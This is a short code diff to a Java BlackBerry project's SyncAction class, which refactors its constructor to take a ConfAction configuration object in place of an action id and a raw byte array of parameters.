@@ -18,6 +18,7 @@ import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
 import blackberry.agent.Module;
+import blackberry.config.ConfAction;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
@@ -38,8 +39,8 @@ public abstract class SyncAction extends SubAction {
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
     //#endif
 
-    public SyncAction(int actionId, final byte[] confParams) {
-        super(actionId);
+    public SyncAction(ConfAction conf) {
+        super(conf);
 
         logCollector = EvidenceCollector.getInstance();
         agentManager = AgentManager.getInstance();
